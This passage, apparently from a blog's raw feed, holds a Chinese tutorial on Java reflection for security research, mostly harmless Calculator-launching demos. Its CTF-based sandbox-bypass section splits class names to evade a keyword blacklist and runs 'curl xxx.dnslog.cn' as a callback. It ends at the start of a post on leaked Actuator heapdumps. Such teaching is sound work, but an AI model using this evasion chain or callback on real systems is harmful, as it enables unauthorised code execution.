class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87-0.png" data-caption="Java安全漫谈-反射篇-0"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87-0.png" alt="Java安全漫谈-反射篇-0"></a></p><h3 id="获取类对象的其它函数"><a href="#获取类对象的其它函数" class="headerlink" title="获取类对象的其它函数"></a>获取类对象的其它函数</h3><p><code>forName</code>不是获取“类”的唯⼀途径，通常有三种⽅式获取⼀个“类”，也就是<code>java.lang.Class</code>对象：</p><ul><li><code>Class.forName(className)</code>，如果已经知道某个类的名字，这样可以获取到它的类</li><li><code>obj.getClass()</code>，如果上下文存在某个类的实例<code>obj</code>，可以直接获取到它的类</li><li><code>Test.class</code>，如果已经加载了某个类，只是想获取它的<code>java.lang.Class</code>对象，那么直接取它的<code>class</code>属性即可。这个方法其实不属于反射<blockquote><p>上面第1和第2种方式获取Class对象时会导致<strong>类属性</strong>被初始化，而且只会执行一次。</p></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">class3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="调用内部类"><a href="#调用内部类" class="headerlink" title="调用内部类"></a>调用内部类</h3><blockquote><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先<code>import</code>才能使用。而使用<code>forName</code>就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p></blockquote><p>另外，经常在一些源码里看到，类名的部分包含<code>$</code>符号，比如 Fastjson 在<code>checkAutoType</code>时就会先将<code>$</code>替换成<code>.</code>（参考链接：<a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038">fastjson&#x2F;parser&#x2F;ParserConfig.java#L1038</a>）<br><code>**$**</code><strong>的作用是查找内部类</strong>：Java 的普通类<code>C1</code>中支持编写内部类<code>C2</code>，而在编译的时候，会生成两个文件：<code>C1.class</code>和<code>C1$C2.class</code>，通过<code>Class.forName(&quot;C1$C2&quot;)</code>即可加载这个内部类。</p><h2 id="Class-newInstance"><a href="#Class-newInstance" class="headerlink" title="Class.newInstance"></a>Class.newInstance</h2><blockquote><p>获得类以后，可以继续使用反射来获取类中的属性和方法，也可以实例化这个类再调用方法。</p></blockquote><p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#newInstance%28%29">Class.newInstance()</a>，Java反射框架中<strong>类对象创建新的实例化对象</strong>的方法。作用就是调用这个类的无参构造函数。当调用<code>newInstance</code>不成功时，原因可能是：</p><ul><li>使用的类没有无参构造函数</li><li>使用的类构造函数是私有的</li></ul><h3 id="私有的类构造方法"><a href="#私有的类构造方法" class="headerlink" title="私有的类构造方法"></a>私有的类构造方法</h3><p>最常见的情况就是<code>java.lang.Runtime</code>，这个类在构造命令执行Payload时经常用到，但不能直接这样来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNewInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 报错</span></span><br><span class="line"><span class="comment">Exception ... can not access a member of class java.lang.Runtime with modifiers &quot;private&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原因是<code>java.lang.Runtime</code>这个类的构造方法是私有的，这里涉及到<a href="https://www.runoob.com/design-pattern/singleton-pattern.html">单例模式</a>的设计思想（比如Web应用中的数据库链接，通常只需要链接一次。此时可以将数据库链接所使用的类的构造函数设为私有，这样<strong>只有在类初始化时才会执行一次构造函数</strong>，然后通过编写一个静态方法来获取这个数据库对象）<br>这里<code>Runtime</code>类也使用了单例模式，因此只能通过<code>Runtime.getRuntime()</code>来获取<code>Runtime</code>对象。所以需要修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNewInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">            clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), </span><br><span class="line">            <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="getMethod和invoke"><a href="#getMethod和invoke" class="headerlink" title="getMethod和invoke"></a>getMethod和invoke</h3><blockquote><p>上面的例子中用到了<code>getMethod()</code>和<code>invoke()</code>方法。正常执行方法是<code>[1].method([2], [3], [4]...)</code> ，在反射里就是<code>method.invoke([1], [2], [3], [4]...)</code></p></blockquote><p><code>getMethod()</code>，作用是通过反射获取Class对象的指定公有方法，调用<code>getMethod()</code>时需要根据获取的方法传递对应的<strong>参数类型列表</strong>。<br>例如需要调用<code>Runtime.exec()</code>方法，该方法有6个重载，以第一个为例：<code>exec(String command)</code>，那么就需要传递一个<code>String</code>类的类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getMethod(<span class="string">&quot;exec&quot;</span>, String.class)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p><code>invoke()</code>属于<code>Method</code>类，作用是对方法进行调用</p><ul><li>如果执行的是普通方法，那么第一个参数是类对象</li><li>如果执行的是静态方法，那么第一个参数是类</li></ul><p>所以前面的例子也可以修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNewInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);    </span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">        </span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有2个问题：</p><ul><li>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，怎样通过反射实例化该类？</li><li>如果一个方法或构造方法是私有方法，是否能够通过反射执行？</li></ul><h2 id="Class-getConstructor"><a href="#Class-getConstructor" class="headerlink" title="Class.getConstructor"></a>Class.getConstructor</h2><blockquote><p>如果一个类没有无参构造方法，也没有单例模式里的静态方法，怎样通过反射实例化该类？</p></blockquote><p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getConstructor%28java.lang.Class...%29">Class.getConstructor()</a>，作用是获取构造函数对象，接收的参数是<strong>构造函数的参数类型列表</strong>。获取到构造函数后，使用<code>newInstance</code>来进行实例化<br>以另一种命令执行方式<code>ProcessBuilder</code>类为例，该类有两个构造函数：</p><ul><li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li><li><code>public ProcessBuilder(String... command)</code></li></ul><h3 id="反射替代强制类型转换"><a href="#反射替代强制类型转换" class="headerlink" title="反射替代强制类型转换"></a>反射替代强制类型转换</h3><p>第一种构造函数，需要传入<code>List.class</code>类对象。先通过反射来获取其构造函数，再调用<code>start()</code>方法执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个Payload用到了强制类型转换，实际情况下利用漏洞的时候没有这种语法，所以需要利用反射来完成这一步。这里通过<code>getMethod(&quot;start&quot;)</code>获取到<code>start</code>方法，然后<code>invoke</code>执行，<code>invoke</code>的第一个参数就是<code>ProcessBuilder</code>类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(</span><br><span class="line">            clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="可变长参数"><a href="#可变长参数" class="headerlink" title="可变长参数"></a>可变长参数</h3><p>第二种构造函数，传递的参数为<code>(String... command)</code>，即表示这是一个可变长参数。如果想要在反射中获取这种参数，将其看作数组即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用<code>newInstance</code>的时候，因为这个函数本身接收的是一个可变长参数，<code>ProcessBuilder</code>所接收的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样地可以利用完全反射完成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(</span><br><span class="line">            clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;&#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Class-getDeclared"><a href="#Class-getDeclared" class="headerlink" title="Class.getDeclared"></a>Class.getDeclared</h2><blockquote><p>如果一个方法或构造方法是私有方法，是否能够通过反射执行？</p></blockquote><p>这里涉及到<code>getDeclared</code>系列的方法：<a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getDeclaredMethod%28java.lang.String,%20java.lang.Class...%29">getDeclaredMethod()</a>和<a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getDeclaredConstructor%28java.lang.Class...%29">getDeclaredConstructor()</a>。它们和普通<code>getMethod()/getConstructor()</code>的用法类似，主要区别在于：</p><ul><li><code>getMethod()</code>系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li><li><code>getDeclaredMethod()</code>系列方法获取的是当前类中“声明”的方法，包括私有方法，但不包括从父类继承的方法</li></ul><h3 id="反射私有构造方法"><a href="#反射私有构造方法" class="headerlink" title="反射私有构造方法"></a>反射私有构造方法</h3><ul><li>以<code>java.lang.Runtime</code>类为例，前文说到这个类的构造方法是私有的。这里可以直接调用<code>getDeclaredConstructor()</code>来获取这个私有的构造方法来实例化对象，从而执行命令<ul><li>需要注意的是，获取私有方法后需要用<code>setAccessible()</code>修改其作用域，否则仍然不能调用。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDeclared</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cs</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        cs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">            cs.newInstance(), </span><br><span class="line">            <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实例-沙盒绕过"><a href="#实例-沙盒绕过" class="headerlink" title="实例-沙盒绕过"></a>实例-沙盒绕过</h2><blockquote><p>在安全研究中，我们使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。</p></blockquote><p>⽐如上下⽂中如果只有<code>Integer</code>类型的数字，如何获取到可以执⾏命令的<code>Runtime</code>类呢，伪代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>Code-Breaking 2018中某道题的第三方Writup：<a href="http://rui0.cn/archives/1015">http://rui0.cn/archives/1015</a></p></blockquote><p>在JAVA中可以通过下面代码来执行命令，但在题目中使用了黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;curl xxx.dnslog.cn&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用反射来构造一条调用链，这样就可以在关键字处使用字符串拼接来达到绕过黑名单的效果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)), <span class="string">&quot;curl xxx.dnslog.cn);</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>整理一下比较容易理解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass()            <span class="comment">// 获取 Class 对象</span></span><br><span class="line">.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)      <span class="comment">// 获取 Runtime 对象</span></span><br><span class="line">.getMethod(<span class="string">&quot;exec&quot;</span>, String.class)   <span class="comment">// 获取 exec 方法</span></span><br><span class="line">.invoke(                           <span class="comment">// 反射调用 exec 方法</span></span><br><span class="line">    String.class.getClass()        <span class="comment">// 同上,获取并调用 getRuntime 方法</span></span><br><span class="line">    .forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">    .getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line">    .invoke(                       <span class="comment">// 同上,获取 Runtime 对象</span></span><br><span class="line">        String.class.getClass()</span><br><span class="line">    .forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">    ), </span><br><span class="line">  <span class="string">&quot;curl xxx.dnslog.cn&quot;</span>             <span class="comment">// exec 方法参数</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>完整代码：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec(&quot;curl xxx.dnslog.cn&quot;)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String.class.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">                String.class.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(</span><br><span class="line">                    String.class.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">                ), <span class="string">&quot;curl xxx.dnslog.cn&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>参考文章：<ul><li><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html">java.lang.Class</a></li><li><a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a></li><li><a href="https://forum.butian.net/share/1333">Java反序列化学习之反射</a></li><li><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Actuator Heapdump 堆转储文件泄露</title>
      <link href="/posts/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2.html"/>
      <url>/posts/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Heapdump</code>，即堆转储文件，是一个Java进程在某个时间点上的内存快照。<code>HeapDump</code>记录了JVM中堆内存运行的情况，保存了Java对象、类以及线程栈以及本地变量等信息。</p></blockquote><ul><li>路径：<code>/actuator/heapdump</code></li><li>工具：<ul><li><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></li><li><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 